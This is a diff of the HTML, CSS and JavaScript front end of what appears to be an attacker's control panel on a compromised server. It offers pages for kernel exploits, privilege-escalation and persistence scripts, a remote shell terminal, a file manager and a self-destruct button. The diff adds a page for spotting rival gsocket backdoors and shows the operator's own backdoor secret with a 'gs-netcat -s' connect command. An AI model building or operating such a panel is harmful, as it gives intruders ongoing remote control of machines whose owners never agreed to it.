@@ -2,134 +2,135 @@
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-font-smoothing:antialiased}
-:root{--bg:#030304;--panel:#08090c;--card:#0c0d12;--glass:rgba(255,255,255,0.01);--glass2:rgba(255,255,255,0.025);--border:rgba(255,255,255,0.035);--border2:rgba(255,255,255,0.06);--text:#9ca3af;--text2:#4b5563;--text3:#374151;--gold:#d4a012;--gold2:#b8860b;--goldGlow:rgba(212,160,18,0.1);--green:#10b981;--greenGlow:rgba(16,185,129,0.15);--red:#ef4444;--blue:#3b82f6;--cyan:#06b6d4}
+:root{--bg:#030304;--panel:#08090c;--card:#0c0d12;--glass:rgba(255,255,255,0.01);--glass2:rgba(255,255,255,0.025);--border:rgba(255,255,255,0.04);--border2:rgba(255,255,255,0.07);--text:#9ca3af;--text2:#4b5563;--text3:#374151;--gold:#d4a012;--gold2:#b8860b;--goldGlow:rgba(212,160,18,0.12);--green:#10b981;--greenGlow:rgba(16,185,129,0.15);--red:#ef4444;--redGlow:rgba(239,68,68,0.15);--blue:#3b82f6;--cyan:#06b6d4;--purple:#8b5cf6}
 html,body{height:100%;overflow:hidden}
 body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:12px}
-body::before{content:'';position:fixed;inset:0;background:url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");opacity:.015;pointer-events:none;z-index:10000}
-body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 20%,rgba(212,160,18,0.03),transparent 50%),radial-gradient(ellipse at 80% 80%,rgba(16,185,129,0.02),transparent 50%);pointer-events:none}
+body::before{content:'';position:fixed;inset:0;background:url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");opacity:.02;pointer-events:none;z-index:10000}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 10%,rgba(212,160,18,0.04),transparent 50%),radial-gradient(ellipse at 80% 90%,rgba(16,185,129,0.03),transparent 50%);pointer-events:none}
 
-.app{display:grid;grid-template-columns:56px 1fr 300px;grid-template-rows:1fr;height:100vh}
+.app{display:grid;grid-template-columns:56px 1fr 280px;height:100vh}
 .sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;align-items:center;padding:16px 0;gap:4px}
-.sidebar .logo{width:32px;height:32px;background:linear-gradient(135deg,var(--gold),var(--gold2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono';font-weight:600;font-size:11px;color:#000;margin-bottom:16px}
+.logo{width:32px;height:32px;background:linear-gradient(135deg,var(--gold),var(--gold2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono';font-weight:700;font-size:10px;color:#000;margin-bottom:20px;box-shadow:0 4px 20px var(--goldGlow)}
 .nav-item{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:10px;cursor:pointer;transition:all .15s;color:var(--text2);position:relative}
 .nav-item:hover{background:var(--glass2);color:var(--text)}
 .nav-item.on{background:var(--goldGlow);color:var(--gold)}
-.nav-item.on::before{content:'';position:absolute;left:0;top:50%;transform:translateY(-50%);width:2px;height:20px;background:var(--gold);border-radius:0 2px 2px 0}
+.nav-item.on::before{content:'';position:absolute;left:0;top:50%;transform:translateY(-50%);width:2px;height:16px;background:var(--gold);border-radius:0 2px 2px 0}
 .nav-item svg{width:18px;height:18px}
-.nav-sep{width:24px;height:1px;background:var(--border);margin:8px 0}
+.nav-sep{width:20px;height:1px;background:var(--border);margin:8px 0}
 .nav-bottom{margin-top:auto}
 
 main{background:var(--bg);overflow-y:auto;padding:20px}
-main::-webkit-scrollbar{width:6px}
+main::-webkit-scrollbar{width:5px}
 main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
 
 .header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
-.header h1{font-size:18px;font-weight:500;color:var(--text)}
+.header h1{font-size:16px;font-weight:500;color:var(--text)}
 .header h1 span{color:var(--gold)}
-.badge{display:inline-flex;align-items:center;gap:6px;background:var(--greenGlow);border:1px solid rgba(16,185,129,0.2);padding:6px 12px;border-radius:6px;font-size:10px;color:var(--green)}
-.badge i{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 2s infinite}
-@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(16,185,129,0.4)}50%{opacity:.6;box-shadow:0 0 0 4px rgba(16,185,129,0)}}
+.badge{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:6px;font-size:10px}
+.badge.green{background:var(--greenGlow);border:1px solid rgba(16,185,129,0.2);color:var(--green)}
+.badge.gold{background:var(--goldGlow);border:1px solid rgba(212,160,18,0.2);color:var(--gold)}
+.badge i{width:6px;height:6px;border-radius:50%;animation:pulse 2s infinite}
+.badge.green i{background:var(--green)}
+.badge.gold i{background:var(--gold)}
+@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 currentColor}50%{opacity:.5}}
 
-.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:14px}
 .grid-2{grid-template-columns:repeat(2,1fr)}
 .grid-3{grid-template-columns:repeat(3,1fr)}
-.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;position:relative;overflow:hidden}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(212,160,18,0.2),transparent)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(212,160,18,0.15),transparent)}
 .card.full{grid-column:1/-1}
 .card.span-2{grid-column:span 2}
-.card.span-3{grid-column:span 3}
-.card-title{font-size:10px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
-.card-title svg{width:14px;height:14px;opacity:.5}
-.card-value{font-family:'JetBrains Mono';font-size:20px;font-weight:500;color:var(--text)}
-.card-value.sm{font-size:13px}
-.card-sub{font-size:10px;color:var(--text2);margin-top:4px}
-
-.stat-row{display:flex;gap:16px}
-.stat-item{flex:1}
-.stat-label{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
-.stat-val{font-family:'JetBrains Mono';font-size:12px;color:var(--text)}
+.card-title{font-size:9px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.card-title svg{width:12px;height:12px;opacity:.5}
+.card-value{font-family:'JetBrains Mono';font-size:18px;font-weight:500;color:var(--text)}
+.card-value.sm{font-size:12px}
+.card-sub{font-size:9px;color:var(--text2);margin-top:3px}
 
 .term{background:#000;border:1px solid var(--border);border-radius:8px;overflow:hidden;display:flex;flex-direction:column}
-.term-bar{background:linear-gradient(180deg,#1a1a1a,#111);padding:8px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
-.term-dots{display:flex;gap:6px}
-.term-dots span{width:10px;height:10px;border-radius:50%;background:#333}
+.term-bar{background:linear-gradient(180deg,#151515,#0a0a0a);padding:8px 12px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border)}
+.term-dots{display:flex;gap:5px}
+.term-dots span{width:9px;height:9px;border-radius:50%}
 .term-dots span:nth-child(1){background:#ff5f57}
 .term-dots span:nth-child(2){background:#ffbd2e}
 .term-dots span:nth-child(3){background:#28ca42}
-.term-title{margin-left:auto;font-family:'JetBrains Mono';font-size:10px;color:var(--text2)}
-.term-body{font-family:'JetBrains Mono';font-size:11px;padding:12px;flex:1;overflow-y:auto;min-height:150px;max-height:300px;line-height:1.6}
-.term-body::-webkit-scrollbar{width:4px}
+.term-title{margin-left:auto;font-family:'JetBrains Mono';font-size:9px;color:var(--text3)}
+.term-body{font-family:'JetBrains Mono';font-size:10px;padding:10px;flex:1;overflow-y:auto;min-height:120px;max-height:260px;line-height:1.6}
+.term-body::-webkit-scrollbar{width:3px}
 .term-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
-.ln{margin:1px 0;padding-left:14px;position:relative;opacity:0;animation:fadeIn .15s forwards}
-.ln::before{content:'›';position:absolute;left:0;color:var(--text3)}
+.ln{margin:1px 0;padding-left:12px;position:relative;opacity:0;animation:fadeIn .12s forwards}
+.ln::before{content:'›';position:absolute;left:0;color:var(--text3);font-size:9px}
 .ln.cmd{color:var(--gold)}.ln.cmd::before{content:'$';color:var(--gold)}
 .ln.ok{color:var(--green)}.ln.ok::before{content:'✓';color:var(--green)}
 .ln.err{color:var(--red)}.ln.err::before{content:'!';color:var(--red)}
 .ln.info{color:var(--text2)}
 @keyframes fadeIn{to{opacity:1}}
-.term-input{display:flex;background:#0a0a0a;border-top:1px solid var(--border)}
-.term-input input{flex:1;background:transparent;border:none;padding:10px 12px;color:var(--text);font-family:'JetBrains Mono';font-size:11px;outline:none}
-.term-input input::placeholder{color:var(--text3)}
-.term-input button{background:var(--gold);color:#000;border:none;padding:0 16px;font-family:'JetBrains Mono';font-size:10px;font-weight:600;cursor:pointer}
+.term-input{display:flex;background:#080808;border-top:1px solid var(--border)}
+.term-input input{flex:1;background:transparent;border:none;padding:10px;color:var(--text);font-family:'JetBrains Mono';font-size:10px;outline:none}
+.term-input button{background:var(--gold);color:#000;border:none;padding:0 14px;font-family:'JetBrains Mono';font-size:9px;font-weight:600;cursor:pointer}
 
-.exp-list{max-height:280px;overflow-y:auto}
-.exp{display:flex;align-items:center;padding:12px;background:var(--glass);border:1px solid var(--border);border-radius:8px;margin-bottom:6px;cursor:pointer;transition:all .2s}
-.exp:hover{border-color:var(--gold);background:var(--goldGlow);transform:translateX(4px)}
-.exp-cve{font-family:'JetBrains Mono';font-size:11px;font-weight:600;width:130px;color:var(--gold)}
-.exp-name{flex:1;font-size:11px;color:var(--text2)}
-.exp-rate{font-family:'JetBrains Mono';font-size:11px;font-weight:600;width:45px;text-align:right}
-.exp-bar{width:80px;height:4px;background:var(--glass2);border-radius:2px;margin-left:12px;overflow:hidden}
-.exp-bar i{display:block;height:100%;border-radius:2px;transition:width .5s}
+.exp{display:flex;align-items:center;padding:10px 12px;background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:5px;cursor:pointer;transition:all .15s}
+.exp:hover{border-color:var(--gold);background:var(--goldGlow);transform:translateX(3px)}
+.exp-cve{font-family:'JetBrains Mono';font-size:10px;font-weight:600;width:120px;color:var(--gold)}
+.exp-name{flex:1;font-size:10px;color:var(--text2)}
+.exp-rate{font-family:'JetBrains Mono';font-size:10px;font-weight:600;width:40px;text-align:right}
+.exp-bar{width:70px;height:3px;background:var(--glass2);border-radius:2px;margin-left:10px;overflow:hidden}
+.exp-bar i{display:block;height:100%;border-radius:2px}
 
-.progress{height:3px;background:var(--glass2);border-radius:2px;overflow:hidden;margin:8px 0}
-.progress i{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));border-radius:2px;transition:width .3s}
+.gs-item{display:flex;align-items:center;padding:12px;background:var(--glass);border:1px solid var(--border);border-radius:8px;margin-bottom:8px;position:relative;overflow:hidden}
+.gs-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--red)}
+.gs-item.mine::before{background:var(--green)}
+.gs-info{flex:1;padding-left:12px}
+.gs-secret{font-family:'JetBrains Mono';font-size:11px;color:var(--gold);margin-bottom:4px}
+.gs-meta{font-size:9px;color:var(--text2);display:flex;gap:12px}
+.gs-actions{display:flex;gap:6px}
 
-.btn{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;padding:10px 20px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;transition:all .2s;font-family:'Inter'}
-.btn:hover{box-shadow:0 4px 20px var(--goldGlow);transform:translateY(-1px)}
+.progress{height:2px;background:var(--glass2);border-radius:1px;overflow:hidden;margin:6px 0}
+.progress i{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));border-radius:1px}
+
+.btn{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;padding:8px 16px;border-radius:5px;font-size:10px;font-weight:600;cursor:pointer;transition:all .15s;font-family:'Inter'}
+.btn:hover{box-shadow:0 4px 15px var(--goldGlow)}
+.btn-sm{padding:5px 10px;font-size:9px}
 .btn-ghost{background:var(--glass2);border:1px solid var(--border);color:var(--text)}
 .btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
 .btn-red{background:linear-gradient(135deg,var(--red),#dc2626);color:#fff}
-.btn-sm{padding:6px 12px;font-size:10px}
-.btns{display:flex;gap:8px;flex-wrap:wrap}
 
-.qs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
-.qs span{padding:8px 14px;background:var(--glass);border:1px solid var(--border);border-radius:6px;font-size:10px;color:var(--text2);cursor:pointer;transition:all .15s;font-family:'JetBrains Mono'}
+.qs{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:10px}
+.qs span{padding:7px 12px;background:var(--glass);border:1px solid var(--border);border-radius:5px;font-size:9px;color:var(--text2);cursor:pointer;transition:all .12s;font-family:'JetBrains Mono'}
 .qs span:hover{border-color:var(--gold);color:var(--gold);background:var(--goldGlow)}
 
 .page{display:none}.page.on{display:block}
 
-/* Right Sidebar - File Manager */
 .rsb{background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
-.rsb-head{padding:16px;border-bottom:1px solid var(--border)}
-.rsb-head h3{font-size:10px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px}
-.fm-path{font-family:'JetBrains Mono';font-size:10px;display:flex;flex-wrap:wrap;gap:4px;color:var(--text2)}
+.rsb-head{padding:14px;border-bottom:1px solid var(--border)}
+.rsb-head h3{font-size:9px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
+.fm-path{font-family:'JetBrains Mono';font-size:9px;display:flex;flex-wrap:wrap;gap:3px;color:var(--text2)}
 .fm-path a{color:var(--gold);text-decoration:none}
-.fm-path a:hover{text-decoration:underline}
-.rsb-body{flex:1;overflow-y:auto;padding:8px}
-.rsb-body::-webkit-scrollbar{width:4px}
+.rsb-body{flex:1;overflow-y:auto;padding:6px}
+.rsb-body::-webkit-scrollbar{width:3px}
 .rsb-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
-.fm-item{display:flex;align-items:center;padding:10px;border-radius:8px;cursor:pointer;transition:all .1s;margin-bottom:2px}
+.fm-item{display:flex;align-items:center;padding:8px;border-radius:6px;cursor:pointer;transition:all .1s;margin-bottom:1px}
 .fm-item:hover{background:var(--glass2)}
-.fm-item.sel{background:var(--goldGlow);border:1px solid rgba(212,160,18,0.2)}
-.fm-icon{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:var(--glass2);border-radius:6px;margin-right:10px;font-size:14px}
+.fm-icon{width:26px;height:26px;display:flex;align-items:center;justify-content:center;background:var(--glass2);border-radius:5px;margin-right:8px;font-size:12px}
 .fm-icon.dir{background:rgba(212,160,18,0.1)}
 .fm-info{flex:1;min-width:0}
-.fm-name{font-size:11px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.fm-meta{font-family:'JetBrains Mono';font-size:9px;color:var(--text3);margin-top:2px}
-.fm-preview{background:var(--card);border:1px solid var(--border);border-radius:8px;margin:8px;padding:12px;max-height:180px;overflow:auto;font-family:'JetBrains Mono';font-size:10px;line-height:1.5;white-space:pre-wrap;word-break:break-all;color:var(--text2)}
+.fm-name{font-size:10px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.fm-meta{font-family:'JetBrains Mono';font-size:8px;color:var(--text3);margin-top:2px}
+.fm-preview{background:var(--card);border:1px solid var(--border);border-radius:6px;margin:6px;padding:10px;max-height:140px;overflow:auto;font-family:'JetBrains Mono';font-size:9px;line-height:1.5;white-space:pre-wrap;word-break:break-all;color:var(--text2)}
 
-.key-box{background:#000;border:1px solid var(--border);border-radius:6px;padding:14px;font-family:'JetBrains Mono';font-size:11px;color:var(--gold);word-break:break-all;cursor:pointer;transition:all .2s}
-.key-box:hover{border-color:var(--gold);background:var(--goldGlow)}
+.key-box{background:#000;border:1px solid var(--border);border-radius:5px;padding:12px;font-family:'JetBrains Mono';font-size:10px;color:var(--gold);word-break:break-all;cursor:pointer;transition:all .15s}
+.key-box:hover{border-color:var(--gold)}
+.key-box:active{background:var(--goldGlow)}
 
-.realtime{position:absolute;top:16px;right:16px;display:flex;align-items:center;gap:6px;font-size:9px;color:var(--green)}
-.realtime i{width:5px;height:5px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}
+.live-stats{display:grid;grid-template-columns:repeat(2,1fr);gap:6px}
+.live-stat{background:var(--glass);border-radius:5px;padding:8px}
+.live-stat-label{font-size:8px;color:var(--text3);text-transform:uppercase;margin-bottom:3px}
+.live-stat-value{font-family:'JetBrains Mono';font-size:13px;color:var(--text)}
+.live-stat-bar{height:2px;background:var(--glass2);border-radius:1px;margin-top:5px;overflow:hidden}
+.live-stat-bar i{height:100%;border-radius:1px;transition:width .4s}
 
-.live-stats{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
-.live-stat{background:var(--glass);border-radius:6px;padding:10px}
-.live-stat-label{font-size:9px;color:var(--text3);text-transform:uppercase;margin-bottom:4px}
-.live-stat-value{font-family:'JetBrains Mono';font-size:14px;color:var(--text)}
-.live-stat-bar{height:3px;background:var(--glass2);border-radius:2px;margin-top:6px;overflow:hidden}
-.live-stat-bar i{height:100%;border-radius:2px;transition:width .5s}
+.realtime{position:absolute;top:14px;right:14px;display:flex;align-items:center;gap:5px;font-size:8px;color:var(--green)}
+.realtime i{width:4px;height:4px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}
 </style></head>
 <body>
 <div class="app">
@@ -140,6 +141,7 @@ main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
 <div class="nav-item" data-p="scr" title="Scripts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></div>
 <div class="nav-item" data-p="term" title="Terminal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
 <div class="nav-sep"></div>
+<div class="nav-item" data-p="gs" title="GSockets"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
 <div class="nav-item" data-p="proc" title="Processes"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
 <div class="nav-item" data-p="net" title="Network"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg></div>
 <div class="nav-bottom">
@@ -151,58 +153,67 @@ main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
 
 <main>
 <div id="p-dash" class="page on">
-<div class="header"><h1>System <span>Overview</span></h1><div class="badge"><i></i>GSSocket Active</div></div>
+<div class="header"><h1>System <span>Overview</span></h1><div class="badge green"><i></i>Online</div></div>
 <div class="grid">
-<div class="card"><div class="card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>Kernel</div><div class="card-value" id="s_kernel">-</div></div>
-<div class="card"><div class="card-title">User</div><div class="card-value" id="s_user">-</div><div class="card-sub" id="s_uid"></div></div>
+<div class="card"><div class="card-title">Kernel</div><div class="card-value sm" id="s_kernel">-</div></div>
+<div class="card"><div class="card-title">User</div><div class="card-value sm" id="s_user">-</div><div class="card-sub" id="s_uid"></div></div>
 <div class="card"><div class="card-title">Uptime</div><div class="card-value sm" id="s_uptime">-</div></div>
 <div class="card"><div class="card-title">Memory</div><div class="card-value sm" id="s_mem">-</div></div>
 </div>
 <div class="grid grid-2">
-<div class="card" style="position:relative"><div class="realtime"><i></i>LIVE</div><div class="card-title">System Resources</div><div class="live-stats" id="live"></div></div>
-<div class="card"><div class="card-title">Quick Actions</div><div class="qs"><span onclick="nav('exp')">⚡ Exploit Scan</span><span onclick="nav('term')">▸ Terminal</span><span onclick="nav('proc')">◈ Processes</span><span onclick="nav('net')">◉ Network</span><span onclick="pull()">↻ Update</span></div></div>
+<div class="card" style="position:relative"><div class="realtime"><i></i>LIVE</div><div class="card-title">Resources</div><div class="live-stats" id="live"></div></div>
+<div class="card"><div class="card-title">Quick</div><div class="qs"><span onclick="nav('exp')">⚡ Exploits</span><span onclick="nav('gs')">🛡 GSockets</span><span onclick="nav('term')">▸ Shell</span><span onclick="pull()">↻ Update</span></div></div>
 </div>
-<div class="card full"><div class="card-title">Vulnerability Scanner</div><div id="scan"></div></div>
+<div class="card full"><div class="card-title">Vulnerability Scan</div><div id="scan"></div></div>
 </div>
 
 <div id="p-exp" class="page">
 <div class="header"><h1>Kernel <span>Exploits</span></h1></div>
-<div class="card"><div class="exp-list" id="expl"></div></div>
+<div class="card"><div id="expl" style="max-height:calc(100vh - 180px);overflow-y:auto"></div></div>
 </div>
 
 <div id="p-scr" class="page">
-<div class="header"><h1>Script <span>Execution</span></h1></div>
-<div class="card"><div class="qs"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/persist.sh')">persist</span></div><div style="display:flex;gap:8px;margin-top:12px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);padding:12px;border-radius:6px;color:var(--text);font-family:'JetBrains Mono';font-size:11px;outline:none" placeholder="scripts/example.sh"><button class="btn" onclick="rs($('sp').value)">Execute</button></div></div>
-<div class="card" style="margin-top:12px"><div class="term" style="height:350px"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">output</div></div><div class="term-body" id="so" style="max-height:300px"></div></div></div>
+<div class="header"><h1>Script <span>Runner</span></h1></div>
+<div class="card">
+<div class="qs"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/persist.sh')">persist</span></div>
+<div style="display:flex;gap:6px;margin-top:10px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);padding:10px;border-radius:5px;color:var(--text);font-family:'JetBrains Mono';font-size:10px;outline:none" placeholder="scripts/custom.sh"><button class="btn" onclick="rs($('sp').value)">Run</button></div>
+</div>
+<div class="card" style="margin-top:12px"><div class="term" style="height:320px"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">output</div></div><div class="term-body" id="so" style="max-height:270px"></div></div></div>
 </div>
 
 <div id="p-term" class="page">
 <div class="header"><h1>Shell <span>Terminal</span></h1></div>
-<div class="card"><div class="term" style="height:calc(100vh - 180px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="to" style="max-height:calc(100vh - 280px)"></div><div class="term-input"><input id="tc" placeholder="Enter command..." onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">RUN</button></div></div></div>
+<div class="card"><div class="term" style="height:calc(100vh - 160px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="to" style="max-height:calc(100vh - 260px)"></div><div class="term-input"><input id="tc" placeholder="$ command" onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">EXEC</button></div></div></div>
+</div>
+
+<div id="p-gs" class="page">
+<div class="header"><h1>GSSocket <span>Scanner</span></h1><button class="btn btn-sm" onclick="scanGS()">🔍 Scan Now</button></div>
+<div class="card"><div class="card-title">Detected GSockets</div><p style="font-size:10px;color:var(--text2);margin-bottom:12px">Find and manage gsocket backdoors installed by other hackers</p><div id="gslist"></div></div>
+<div class="card" style="margin-top:12px"><div class="card-title">Your GSocket</div><div class="gs-item mine"><div class="gs-info"><div class="gs-secret" id="mygs">%s</div><div class="gs-meta"><span>🔒 Your backdoor</span><span>Active</span></div></div></div><p style="font-size:9px;color:var(--text2);margin-top:10px">Connect: <code style="color:var(--gold)">gs-netcat -s %s</code></p></div>
 </div>
 
 <div id="p-proc" class="page">
-<div class="header"><h1>Process <span>Monitor</span></h1><div class="badge" style="cursor:pointer" onclick="loadProc()"><i></i>Refresh</div></div>
-<div class="card"><div class="term" style="height:calc(100vh - 180px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps aux</div></div><div class="term-body" id="po" style="max-height:calc(100vh - 250px)"></div></div></div>
+<div class="header"><h1>Process <span>Monitor</span></h1><div class="badge gold" style="cursor:pointer" onclick="loadProc()"><i></i>Refresh</div></div>
+<div class="card"><div class="term" style="height:calc(100vh - 160px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps aux</div></div><div class="term-body" id="po" style="max-height:calc(100vh - 230px)"></div></div></div>
 </div>
 
 <div id="p-net" class="page">
-<div class="header"><h1>Network <span>Connections</span></h1><div class="badge" style="cursor:pointer" onclick="loadNet()"><i></i>Refresh</div></div>
-<div class="card"><div class="term" style="height:calc(100vh - 180px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">netstat</div></div><div class="term-body" id="no" style="max-height:calc(100vh - 250px)"></div></div></div>
+<div class="header"><h1>Network <span>Info</span></h1><div class="badge gold" style="cursor:pointer" onclick="loadNet()"><i></i>Refresh</div></div>
+<div class="card"><div class="term" style="height:calc(100vh - 160px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">connections</div></div><div class="term-body" id="no" style="max-height:calc(100vh - 230px)"></div></div></div>
 </div>
 
 <div id="p-cfg" class="page">
-<div class="header"><h1>System <span>Configuration</span></h1></div>
+<div class="header"><h1>Configuration</h1></div>
 <div class="grid grid-2">
-<div class="card"><div class="card-title">Deploy Key</div><div class="key-box" onclick="navigator.clipboard.writeText(this.innerText);this.style.borderColor='var(--green)'">%s</div><div class="card-sub" style="margin-top:8px">Click to copy</div></div>
-<div class="card"><div class="card-title">GSSocket Secret</div><div class="key-box" id="gsbox">%s</div><div class="card-sub" style="margin-top:8px">gs-netcat -s SECRET -p 8888</div></div>
+<div class="card"><div class="card-title">Deploy Key</div><div class="key-box" onclick="copy(this)">%s</div></div>
+<div class="card"><div class="card-title">Tunnel URL</div><div class="key-box" id="urlbox" onclick="copy(this)">%s</div></div>
 </div>
-<div class="card" style="margin-top:12px"><div class="card-title">Actions</div><div class="btns"><button class="btn" onclick="pull()">↻ Update Repository</button><button class="btn btn-ghost" onclick="rc2('id && whoami && pwd')">Check Identity</button><button class="btn btn-red" onclick="nuke()">☠ Self Destruct</button></div></div>
+<div class="card" style="margin-top:12px"><div class="card-title">Actions</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn" onclick="pull()">↻ Update Repo</button><button class="btn btn-ghost" onclick="rc2('id;pwd')">Check ID</button><button class="btn btn-red" onclick="nuke()">☠ Destruct</button></div></div>
 </div>
 </main>
 
 <div class="rsb">
-<div class="rsb-head"><h3>File Manager</h3><div class="fm-path" id="bc"></div></div>
+<div class="rsb-head"><h3>Files</h3><div class="fm-path" id="bc"></div></div>
 <div class="rsb-body" id="fls"></div>
 <div id="fpreview"></div>
 </div>
@@ -211,74 +222,93 @@ main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
 <script>
 const $=s=>document.getElementById(s);
 const api=async(e,d)=>{try{return(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})})).json();}catch(e){return{error:e.message}}};
-const log=(el,t,c='')=>{const d=document.createElement('div');d.className='ln '+c;d.textContent=t;$(el).appendChild(d);$(el).scrollTop=1e9;};
+const log=(el,t,c='')=>{const d=document.createElement('div');d.className='ln '+c;d.textContent=t;$(el)?.appendChild(d);$(el).scrollTop=1e9;};
 const clear=el=>{if($(el))$(el).innerHTML='';};
